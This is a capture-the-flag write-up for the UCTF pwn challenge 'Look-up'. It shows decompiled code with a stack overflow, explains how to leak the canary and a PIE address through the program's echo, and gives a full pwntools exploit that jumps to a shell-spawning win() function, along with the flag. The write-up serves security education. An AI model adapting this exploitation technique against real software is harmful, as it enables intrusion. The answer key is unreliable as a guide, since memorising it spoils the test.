# Look-up
Unravel the hidden messages buried in the echoes of code.

# Write Up

Before diving into any pwn challenge, it's crucial to examine the security mitigations applied during the compilation of the executable. The checksec tool from the pwntools suite is perfect for this:

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

With all major mitigations enabled, this challenge may seem daunting at first.

When you run the program, it presents the following message and waits for your input:

```
---Welcome to the UCTF---
--- I'll repeat what you say :D ---
```

Without access to the source code, we turn to a disassembler like IDA Pro to understand the program’s behavior. In the vuln() function, we discover a stack buffer overflow vulnerability:

```c
unsigned __int64 vuln()
{
  char s[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("--- I'll repeat what you say :D ---");
  memset(s, 0, sizeof(s));
  read(0, s, 0x64uLL);  // Buffer overflow vulnerability
  printf("You said: %s\n", s);
  if (strstr(s, "UCTF"))
  {
    puts("The Backdoor triggered!");
    vuln();  // Recursively calls itself
  }
  return v2 - __readfsqword(0x28u);
}
```

The program also contains a win() function that runs system("/bin/bash -p"), giving a shell when triggered:

```c
void win()
{
  system("/bin/bash -p");
}
```

To gain a shell, we need to bypass the stack canary and PIE protections. The vuln() function’s behavior provides a critical insight: it echoes back whatever you input. This allows us to leak the stack canary by overflowing the buffer and inspecting the output.

Once the canary is leaked, we can craft a payload that bypasses the canary check. Next, we need to leak another value from the stack that is related to a function. With both the canary and function values in hand, we can overwrite the return address and call the win() function to spawn a shell.

Here is the finall exploit:

```python
from pwn import *

elf = context.binary = ELF("./look-up")
context.log_level = 'debug'
libc = elf.libc

gs = '''
start
'''
def start():
    global gs
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("0.0.0.0", 5000)
    else:
        return process(elf.path)

io = start()

payload = b'UCTF' + b'A' * 7


io.send(payload)
io.recvuntil(b"You said:")
canary = io.recvline()
canary = list(canary)
canary[11] = 0
canary = canary[11:19]
canary = bytearray(canary)
canary = u64(canary)

print(f"Canary = {hex(canary)}")


payload = b'UCTF' + b'B' * 22
io.send(payload)
io.recvuntil(b"You said:")
addr = io.recvline()
addr = list(addr)
addr = addr[27:27+6]
addr = bytearray(addr).ljust(8, b'\x00')

leaked_addr = u64(addr)

print(f'Vuln Leaked addr: {hex(leaked_addr)}')

base = leaked_addr - 169 - 0x000000000000126f

win_addr = base + 0x0000000000001258

payload = b'A' * 10
payload+= p64(canary)
payload+= b'B' * 8
payload+= p64(win_addr)

io.send(payload)

io.interactive()

```

# Flag

`UCTF{Pl4ying_S3t@r_str1ngs_is_Fun_4Evr!}`

# Categories

- [ ] Web
- [ ] Reverse
- [X] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Blockchain
- [ ] Steganography
- [ ] AI

# Points

| Warm up | This Challenge  | Evil |
| ------- |:---------------:| ----:|
| 25      |       300       | 500  |
